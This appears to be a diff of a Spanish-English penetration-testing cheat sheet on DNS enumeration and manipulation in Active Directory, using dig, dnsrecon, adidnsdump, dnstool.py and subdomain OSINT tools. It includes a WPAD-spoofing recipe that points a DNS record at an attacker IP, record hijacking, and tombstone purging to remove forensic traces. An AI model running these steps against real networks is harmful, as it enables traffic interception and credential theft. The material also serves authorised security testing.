@@ -23,235 +23,169 @@ linked:
 
 ## dig (BIND DNS Lookup)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| A record | `dig +short A host.dom.local` | Standard. |
-| AAAA record | `dig +short AAAA host.dom.local` | IPv6. |
-| MX record | `dig +short MX dom.local` | Email. |
-| NS record | `dig +short NS dom.local` | Authoritative. |
-| SOA record | `dig +short SOA dom.local` | Zone metadata. |
-| SRV record | `dig +short SRV _ldap._tcp.dom.local` | AD core. |
-| TXT record | `dig +short TXT dom.local` | SPF/DKIM. |
-| PTR (reverse) | `dig +short -x 10.0.0.10` | Reverse DNS. |
-| ANY records | `dig ANY dom.local` | All types (sometimes hidden). |
-| AXFR | `dig AXFR dom.local @DC` | Zone transfer. |
-| Specific server | `dig @DC dom.local` | Direct query. |
-| Trace path | `dig +trace dom.local` | Full delegation. |
-| No recursion | `dig +norec dom.local` | Authoritative-only. |
-| Short output | `dig +short ...` | Concise. |
-| Full output | `dig +noall +answer ...` | Custom format. |
-| Timeout | `dig +time=5 ...` | Pacing. |
+| `dig +short A <host>.<dom>` | IP del host | Standard lookup. |
+| `dig +short AAAA <host>.<dom>` | IPv6 | Hybrid. |
+| `dig +short SRV _ldap._tcp.dc._msdcs.<dom>` | DCs | AD core discovery. |
+| `dig +short MX <dom>` | Mail servers | Email infra. |
+| `dig +short NS <dom>` | Name servers authoritative | Identificar DNS servers. |
+| `dig +short SOA <dom>` | SOA (master + serial + refresh) | Zone metadata. |
+| `dig +short TXT <dom>` | SPF/DKIM/etc | Email auth, OSINT. |
+| `dig +short -x <ip>` | PTR reverse | Hostname desde IP. |
+| `dig +noall +answer SRV <name>` | Output SRV con priority/weight visibles | Parse manual. |
+| `dig +trace <dom>` | Path completo de resolución | Debug delegation. |
+| `dig +norec <name> @<server>` | Sin recursión, solo authoritative | Identificar authoritative. |
+| `dig @<DC> <dom>` | Query a DC específico | Compare DCs. |
+| `dig AXFR <dom> @<DC>` | Zone transfer | Test misconfig. |
 ^ad-tool-dig
 
-### dig recipes
-
 ```bash
-# Get all DCs
-dig +short SRV _ldap._tcp.dc._msdcs.dom.local
+DOM="corp.local"
 
-# Get DC IPs from SRV chain
-dig +short SRV _ldap._tcp.dc._msdcs.dom.local | \
-  awk '{print $4}' | sed 's/\.$//' | \
+# Pipeline AD discovery
+dig +short SRV "_ldap._tcp.dc._msdcs.$DOM" | awk '{print $4}' | sed 's/\.$//' |
   while read fqdn; do
     echo "$fqdn -> $(dig +short A $fqdn)"
   done
 
-# Direct query against specific DC
-DC="dc01.dom.local"
-dig @$DC dom.local
-
-# Trace full resolution path
-dig +trace dom.local
-
-# AXFR test
-dig AXFR dom.local @$DC
-
-# Full SOA with all metadata
-dig +noall +answer +authority +additional SOA dom.local @$DC
+# AXFR test contra todos DCs
+for dc in $(dig +short NS "$DOM"); do
+  dig AXFR "$DOM" "@$dc" +short | head -5
+done
 ```
 
 ___
 
 ## dnsrecon / dnsenum / fierce
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| dnsrecon standard | `dnsrecon -d dom.local` | Multi-mode. |
-| dnsrecon AXFR-only | `dnsrecon -d dom.local -t axfr` | Targeted. |
-| dnsrecon SRV enum | `dnsrecon -d dom.local -t srv` | AD records. |
-| dnsrecon brute force | `dnsrecon -d dom.local -t brt -D wordlist.txt` | Subdomain. |
-| dnsrecon reverse | `dnsrecon -r 10.0.0.0/24` | PTR sweep. |
-| dnsrecon JSON | `-j out.json` | Parseable. |
-| dnsrecon CSV | `-c out.csv` | Excel-friendly. |
-| dnsrecon Google dorks | `-t goo` | OSINT. |
-| dnsrecon zone walking | `-t zonewalk` (DNSSEC) | Edge. |
-| dnsenum default | `dnsenum dom.local` | Multi-mode similar. |
-| dnsenum threads | `dnsenum --threads 20 dom.local` | Performance. |
-| dnsenum brute | `dnsenum -f wordlist.txt dom.local` | Subdomain. |
-| dnsenum whois | `dnsenum -w dom.local` | OSINT. |
-| fierce default | `fierce -dns dom.local` | Brute + zone walk. |
-| fierce wordlist | `fierce --domain dom.local --subdomain-file list.txt` | Custom. |
-| fierce range scan | `fierce --range 10.0.0.0/24` | Reverse. |
+| `dnsrecon -d <dom>` | std + axfr + srv + brt en uno | Recon completo. |
+| `dnsrecon -d <dom> -t axfr` | Solo AXFR | Test targeted. |
+| `dnsrecon -d <dom> -t srv` | Solo SRV records AD | Bootstrap AD. |
+| `dnsrecon -d <dom> -t brt -D wordlist.txt` | Subdomain brute | Sin AXFR. |
+| `dnsrecon -r 10.0.0.0/24` | Reverse PTR sweep | Network mapping. |
+| `dnsrecon -d <dom> -j out.json` | JSON parseable | Pipeline. |
+| `dnsenum --threads 20 <dom>` | Multi-mode threaded | Alt tool. |
+| `fierce --domain <dom>` | Brute + zone walk | Alt tool. |
 ^ad-tool-dnsrecon
 
-### dnsrecon comprehensive
-
 ```bash
-# Comprehensive recon
-dnsrecon -d dom.local -t std,axfr,srv,brt \
+# Pipeline standard
+dnsrecon -d corp.local -n <DC-IP> -t std,axfr,srv,brt \
   -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -j dom_dns.json
+  -j corp_dns.json
 
-# Parse JSON output
-cat dom_dns.json | jq '.[] | select(.type=="A")'
+# Parse JSON — solo A records
+jq '.[] | select(.type=="A") | {name, address}' corp_dns.json
 ```
 
 ___
 
-## adidnsdump (LDAP-based DNS Enum)
+## adidnsdump (DNS via LDAP)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `pip install git+https://github.com/dirkjanm/adidnsdump` | Source. |
-| Default enum | `adidnsdump -u 'dom\user' --password 'pass' DC` | All zones. |
-| Specific zone | `adidnsdump -u u -p p DC --zone dom.local` | Targeted. |
-| Resolve via DNS | `adidnsdump -u u -p p DC -r` | Validate records. |
-| Print zones only | `adidnsdump -u u -p p DC --print-zones` | Discovery. |
-| Include hidden ANY | `--include-hidden` | Show all. |
-| Verbose | `-v` | Debug. |
-| Output CSV | `records.csv` (default) | Standard. |
-| Forest zones | `--forest` flag (newer versions) | Forest scope. |
-| Kerberos auth | `-k` (requires KRB5CCNAME env) | Modern. |
-| LDAPS auto | Auto-detected | Encrypted. |
-| Anonymous attempt | `-u '' -p ''` | Edge. |
-| Filter records | Combine with `grep`/`jq` | Post-process. |
-| Compare with DNS view | Diff = ANY records | Recon. |
-| Per-zone DACL | Adjacent — bloodyAD | Adjacent. |
-| Decode binary blob | Built-in parser | Standard. |
+| `pip install git+https://github.com/dirkjanm/adidnsdump` | Install | Setup. |
+| `adidnsdump -u 'corp\u' -p pass <DC>` | Default zone records | Standard enum. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --print-zones` | Lista zones | Discovery. |
+| `adidnsdump -u 'corp\u' -p pass <DC> -r --zone <zone>` | Records con DNS resolve | Verify. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --include-tombstoned` | Tombstoned records | Persistence hunt. |
+| `adidnsdump -u 'corp\u' -p pass <DC> -k` | Kerberos auth | Sin password en línea. |
+| `adidnsdump -u 'corp\u' -p pass <DC> --ssl` | LDAPS | Encrypted. |
 ^ad-tool-adidns
 
-### adidnsdump usage
+**Por qué:** AXFR puede estar cerrado, pero LDAP read sobre `DomainDnsZones` está habilitado para `Authenticated Users`. También expone records ANY que DNS server no advertise.
 
 ```bash
-# Basic enum
-adidnsdump -u 'dom\user' --password 'pass' DC
+# Pipeline cred hunt en records
+adidnsdump -u 'corp\auditor' -p pass <DC> -r > records.csv
 
-# Specific zone with DNS verify
-adidnsdump -u 'dom\user' --password 'pass' DC -r --zone dom.local
-
-# Show hidden records (ANY)
-adidnsdump -u 'dom\user' --password 'pass' DC --include-hidden
-
-# Output: records.csv
-# name,type,address,...
+# Records sospechosos
+grep -E "wpad|isatap|^_kerberos|^_ldap|^\*" records.csv
 ```
 
 ___
 
-## dnstool.py (krbrelayx — Manipulation)
+## dnstool.py (krbrelayx — DNS Manipulation)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Acción** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `git clone github.com/dirkjanm/krbrelayx` | Source. |
-| Add A record | `dnstool.py -u 'dom\user' -p pass -a add -r host -d 1.2.3.4 DC` | Standard. |
-| Add CNAME | `dnstool.py ... -a add -r alias -d target -t CNAME DC` | Edge. |
-| Add SRV | `dnstool.py ... -a add -r _service._tcp -d "0 0 port target" -t SRV DC` | Edge. |
-| Modify record | `dnstool.py ... -a modify ...` | Same syntax. |
-| Remove record | `dnstool.py ... -a remove -r host DC` | Cleanup. |
-| Remove tombstone | `--remove-tombstone` | Purge. |
-| Query record | `dnstool.py ... -a query -r host DC` | Read. |
-| Specific zone | `--zone dom.local` | Targeted. |
-| Forest zone | `--forest` | Edge. |
-| Auth via Kerberos | `-k -c "ccache.txt"` | Modern. |
-| TGT-based auth | KRB5CCNAME + `-k` | Modern. |
-| LDAPS auto | Auto | Encrypted. |
-| Required permission | `CreateChild` on zone | Default Auth Users. |
-| Common abuse: WPAD record | Combo with Responder | Standard. |
-| Cleanup: always remove | OPSEC | Hygiene. |
+| `dnstool.py -u 'corp\u' -p pass -a query -r <name> <DC>` | Read record | Pre-modify check. |
+| `dnstool.py -u 'corp\u' -p pass -a add -r <name> -d <ip> <DC>` | Add A record | Spoof / WPAD. |
+| `dnstool.py -u 'corp\u' -p pass -a add -r <name> -d <target> -t CNAME <DC>` | Add CNAME | Aliasing. |
+| `dnstool.py -u 'corp\u' -p pass -a modify -r <name> -d <new-ip> <DC>` | Modify A | Hijack. |
+| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> <DC>` | Soft remove (tombstone) | Cleanup. |
+| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> --remove-tombstone <DC>` | Purge tombstone | Forensic cleanup. |
+| `dnstool.py -u 'corp\u' -p pass -a ldapdelete -r <name> <DC>` | Delete object directo | Edge. |
 ^ad-tool-dnstool
 
-### dnstool.py recipes
+**Default DACL** = `Authenticated Users` con `CreateChild` sobre el zone object. Cualquier user del domain puede crear records.
 
 ```bash
-# Add WPAD record (DNS spoof attack base)
-python3 dnstool.py -u 'dom\user' -p pass -a add -r wpad -d ATTACKER_IP DC
+# WPAD spoof completo
+git clone https://github.com/dirkjanm/krbrelayx
+cd krbrelayx
+
+# Add
+python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>
 
 # Verify
-dig +short A wpad.dom.local
+dig +short A wpad.corp.local @<DC>
 
-# Remove (cleanup)
-python3 dnstool.py -u 'dom\user' -p pass -a remove -r wpad DC
-
-# Add per-host A record (smaller blast radius)
-python3 dnstool.py -u 'dom\user' -p pass -a add -r myhost -d 1.2.3.4 DC
-
-# Query existing record
-python3 dnstool.py -u 'dom\user' -p pass -a query -r dc01 DC
+# Cleanup (siempre)
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
+python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad --remove-tombstone <DC>
 ```
 
 ___
 
-## Cloud / Modern DNS Tools
+## OSINT / External DNS Recon
 
-| **Tool** | **Use** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `subfinder` | Multi-source subdomain enum | OSINT-heavy. |
-| `amass enum -d <dom>` | Comprehensive | OSINT + active. |
-| `amass intel -d <dom>` | Intel gathering | OSINT. |
-| `amass enum -passive -d <dom>` | Passive only | Stealth. |
-| `findomain` | Fast Rust subdomain | Modern. |
-| `assetfinder` | Tomnomnom | Quick. |
-| `chaos-client` | ProjectDiscovery API | API-based. |
-| `crt.sh` cert transparency | Public DNS leak | OSINT. |
-| `securitytrails.com` | Historical DNS | OSINT. |
-| `dnsdumpster.com` | Visual recon | OSINT. |
-| `gobuster dns` | DNS subdomain brute | Active. |
-| `puredns` (massdns wrapper) | Massive subdomain | Performance. |
-| `massdns` | Bulk resolver | Performance. |
-| `dnsx` ProjectDiscovery | Fast resolver toolkit | Modern. |
-| `httpx` after subdomain enum | Live host check | Adjacent. |
-| `katana` JS crawl | Endpoint extract from JS | Adjacent. |
+| `subfinder -d <dom> -all -silent` | Subdomains multi-source | Pre-engagement OSINT. |
+| `amass enum -passive -d <dom>` | Passive aggregation | Pre-engagement. |
+| `amass intel -d <dom>` | Intel (IP ranges, ASNs) | Recon broader. |
+| `findomain -t <dom>` | Rust fast | Quick OSINT. |
+| `curl -s "https://crt.sh/?q=%25.<dom>&output=json" \| jq -r '.[].name_value'` | Cert transparency subdomains | OSINT classic. |
+| `dnsx -resp-only -silent -l subs.txt` | Resolver bulk | Post-discovery. |
+| `httpx -title -web-server -tech-detect -l subs.txt` | HTTP probing post-DNS | Live host enrichment. |
+| `gobuster dns -d <dom> -r <DC-IP> -w wordlist -t 50` | Active brute con DNS resolver custom | Internal recon. |
+| `puredns bruteforce wordlist.txt <dom> -r resolvers.txt` | Massdns wrapper | Bulk performance. |
 ^ad-tool-cloud
 
-### Modern subdomain pipeline
-
 ```bash
-DOM="dom.local"
+DOM="corp.local"
 
-# Aggregate from multiple sources
-subfinder -d "$DOM" -all -silent | tee subdomains.txt
-amass enum -passive -d "$DOM" >> subdomains.txt
-sort -u subdomains.txt > unique_subs.txt
+# Aggregate sources
+subfinder -d "$DOM" -all -silent > subs.txt
+amass enum -passive -d "$DOM" >> subs.txt
+curl -s "https://crt.sh/?q=%25.$DOM&output=json" | jq -r '.[].name_value' >> subs.txt
+sort -u subs.txt > unique.txt
 
-# Resolve and filter live
-cat unique_subs.txt | dnsx -resp-only -silent > live_dns.txt
-
-# HTTP probing
-cat unique_subs.txt | httpx -title -web-server -tech-detect -silent
+# Resolve + probe
+cat unique.txt | dnsx -resp-only -silent > live.txt
+cat unique.txt | httpx -title -web-server -tech-detect -silent
 ```
 
 ___
 
-## Wordlists & Recursos DNS
+## Wordlists & Recursos
 
-| **Recurso** | **Path / URL** | **Notas** |
-|:---:|:---:|:---:|
-| SecLists Discovery DNS | `Discovery/DNS/` | Subdomain wordlists. |
-| `subdomains-top1million-5000.txt` | SecLists | Quick. |
-| `subdomains-top1million-110000.txt` | SecLists | Deep. |
-| `bitquark-subdomains-top100000.txt` | SecLists | Alt. |
-| AD-specific subdomains | `dc dc01 dc02 dns mail web app api dev test` | Custom. |
-| AssetNote wordlists | `assetnote.io/resources` | Curated commercial. |
-| `commonspeak2` wordlists | GitHub | Modern bug bounty. |
-| `seclists-curated` | Targeted lists | Edge. |
-| OWASP DNS recon guide | `owasp.org` | Reference. |
-| HackTricks DNS | `book.hacktricks.xyz/network-services-pentesting/pentesting-dns` | Pentest. |
-| MITRE ATT&CK DNS | T1590.002, T1583.002 | Framework. |
-| RFC 1035 (DNS basics) | IETF spec | Foundation. |
-| RFC 2782 (SRV records) | IETF spec | Authoritative. |
-| RFC 5936 (DNS zone transfer) | IETF spec | AXFR detail. |
-| Microsoft DNS architecture docs | learn.microsoft.com | Vendor. |
-| BloodHound DNS analysis (custom) | Custom Cypher | Adjacent. |
+| **Recurso** | **Path / URL** |
+|:---:|:---:|
+| SecLists DNS | `/usr/share/seclists/Discovery/DNS/` |
+| `subdomains-top1million-5000.txt` | SecLists (quick) |
+| `subdomains-top1million-110000.txt` | SecLists (deep) |
+| AssetNote wordlists | `https://wordlists.assetnote.io/` |
+| commonspeak2 | `https://github.com/assetnote/commonspeak2-wordlists` |
+| HackTricks DNS | `https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns` |
+| RFC 1035 (DNS) | `https://datatracker.ietf.org/doc/html/rfc1035` |
+| RFC 2782 (SRV) | `https://datatracker.ietf.org/doc/html/rfc2782` |
+| RFC 5936 (AXFR) | `https://datatracker.ietf.org/doc/html/rfc5936` |
+| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
 ^ad-tool-wordlists
 
 ***
